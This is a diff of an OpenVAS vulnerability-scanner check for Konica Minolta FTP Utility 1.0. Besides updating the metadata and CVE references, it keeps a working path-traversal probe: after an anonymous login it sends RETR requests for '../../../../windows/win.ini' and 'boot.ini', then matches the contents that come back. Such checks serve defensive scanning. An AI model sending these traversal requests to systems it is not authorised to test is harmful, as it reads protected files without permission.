@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_konica_minolta_ftp_utility_mult_vuln.nasl 6170 2017-05-19 09:03:42Z teissa $
+# $Id: gb_konica_minolta_ftp_utility_mult_vuln.nasl 10847 2018-08-09 02:37:37Z ckuersteiner $
 #
 # Konica Minolta FTP Utility Multiple vulnerabilities
 #
@@ -26,15 +26,27 @@
 
 CPE = "cpe:/a:konicaminolta:ftp_utility";
 
-if (description)
+if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.805750");
-  script_version("$Revision: 6170 $");
-  script_tag(name:"cvss_base", value:"7.5");
-  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2017-05-19 11:03:42 +0200 (Fri, 19 May 2017) $");
+  script_version("$Revision: 10847 $");
+  script_tag(name:"cvss_base", value:"7.8");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-09 04:37:37 +0200 (Thu, 09 Aug 2018) $");
   script_tag(name:"creation_date", value:"2015-09-28 13:43:21 +0530 (Mon, 28 Sep 2015)");
+  script_cve_id("CVE-2015-7603", "CVE-2015-7767", "CVE-2015-7768");
   script_name("Konica Minolta FTP Utility Multiple vulnerabilities");
+  script_category(ACT_ATTACK);
+  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
+  script_family("FTP");
+  script_dependencies("secpod_ftp_anonymous.nasl", "gb_konica_minolta_ftp_utility_detect.nasl");
+  script_mandatory_keys("KonicaMinolta/Ftp/Installed");
+  script_require_ports("Services/ftp", 21);
+
+  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/38260/");
+  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/38252/");
+  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/38254/");
+  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/39215/");
 
   script_tag(name:"summary", value:"This host is running Konica Minolta FTP
   Utility and is prone to multiple vulnerabilities.");
@@ -54,105 +66,71 @@ if (description)
 
   script_tag(name:"affected", value:"Konica Minolta FTP Utility version 1.0.");
 
-  script_tag(name:"solution", value:"No solution or patch was made available
-  for at least one year since disclosure of this vulnerability. Likely none will
+  script_tag(name:"solution", value:"No known solution was made available
+  for at least one year since the disclosure of this vulnerability. Likely none will
   be provided anymore. General solution options are to upgrade to a newer release,
   disable respective features, remove the product or replace the product by another
   one.");
 
-  script_tag(name:"solution_type", value:"NoneAvailable");
-
+  script_tag(name:"solution_type", value:"WillNotFix");
   script_tag(name:"qod_type", value:"remote_vul");
 
-  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/38260");
-  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/38252");
-
-  script_category(ACT_ATTACK);
-  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
-  script_family("FTP");
-  script_dependencies("secpod_ftp_anonymous.nasl", "gb_konica_minolta_ftp_utility_detect.nasl");
-  script_mandatory_keys("KonicaMinolta/Ftp/Installed");
-  script_require_ports("Services/ftp", 21);
- exit(0);
+  exit(0);
 }
-
 
 include("ftp_func.inc");
 include("host_details.inc");
 
-## Variable initialization
-login_details = "";
-ftpPort = "";
-banner = "";
-soc = "";
-user = "";
-password = "";
-
-## Get FTP Port
 ftpPort = get_app_port(cpe:CPE);
 if(!ftpPort){
   exit(0);
 }
 
-## create the socket
 soc = open_sock_tcp(ftpPort);
 if(!soc){
   exit(0);
 }
 
-## Get the FTP user name and password
 user = get_kb_item("ftp/login");
 password = get_kb_item("ftp/password");
 
-## if not user name is given try with anonymous
 if(!user){
   user = "anonymous";
 }
 
-## if not password is given try with anonymous
 if(!password){
   password = string("anonymous");
 }
 
 login_details = ftp_log_in(socket:soc, user:user, pass:password);
-if(!login_details)
-{
+if(!login_details){
  close(soc);
  exit(0);
 }
 
-## Change to PASV Mode
 ftpPort2 = ftp_get_pasv_port(socket:soc);
-if(!ftpPort2)
-{
+if(!ftpPort2){
   close(soc);
   exit(0);
 }
 
-## Open a Socket and Send Crafted request
 soc2 = open_sock_tcp(ftpPort2, transport:get_port_transport(ftpPort));
-if(!soc2)
-{
+if(!soc2){
   close(soc);
   exit(0);
 }
 
-## List the possible system files
 files = make_list("windows/win.ini", "boot.ini", "winnt/win.ini");
-foreach file (files)
-{
-  ## Construct the attack request
+foreach file (files){
   file = "../../../../../../../../" + file;
   attackreq = string("RETR ", file);
   send(socket:soc, data:string(attackreq, "\r\n"));
 
   result = ftp_recv_data(socket:soc2);
 
-  ## confirm the exploit
   if("\WINDOWS" >< result || "; for 16-bit app support" >< result
-                                     || "[boot loader]" >< result)
-  {
-    security_message(port:ftpPort);
+                                     || "[boot loader]" >< result){
+    security_message(port:ftpPort, data:'Received file content:\n\n' + result);
     close(soc2);
     close(soc);
     exit(0);
